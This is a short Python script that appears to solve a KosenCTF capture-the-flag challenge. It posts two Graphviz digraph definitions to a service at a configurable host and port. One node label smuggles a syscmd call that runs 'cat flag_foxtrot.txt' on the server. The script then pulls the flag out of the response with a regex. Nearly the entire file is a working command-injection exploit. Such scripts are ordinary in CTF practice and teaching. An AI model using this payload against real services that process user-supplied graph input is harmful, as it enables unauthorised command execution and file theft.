import requests
import os
import re

HOST = os.getenv('HOST', '0.0.0.0')
PORT = os.getenv('PORT', '10001')

payload = {
    'g1': 'digraph { a0[label="syscmd(`cat flag_foxtrot.txt\')"] }',
    'g2': 'digraph { a0 }'
}

for i in range(3):
    r = requests.post(f"http://{HOST}:{PORT}/", data=payload)

    flag = re.findall("KosenCTF{.+}", r.text)[0]
    print(flag)
